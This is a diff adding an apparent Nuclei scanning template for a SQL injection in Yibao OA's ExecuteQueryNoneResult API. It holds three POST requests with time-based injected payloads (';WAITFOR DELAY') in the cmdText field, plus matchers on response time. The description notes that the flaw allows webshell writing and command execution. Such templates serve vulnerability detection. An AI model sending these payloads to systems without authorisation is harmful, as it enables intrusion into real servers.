@@ -1,0 +1,39 @@
+id: yibao-ExecuteQueryNoneResult-sqli
+info:
+  name: yibao-ExecuteQueryNoneResult-sqli
+  author: apple
+  severity: high
+  description: 易宝OA ExecuteQueryNoneResult SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+        token=zxh&cmdText=;WAITFOR DELAY '0:0:3'--
+      - |-
+        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+        token=zxh&cmdText=;WAITFOR DELAY '0:0:6'--
+      - |-
+        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+        token=zxh&cmdText=;WAITFOR DELAY '0:0:9'--
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
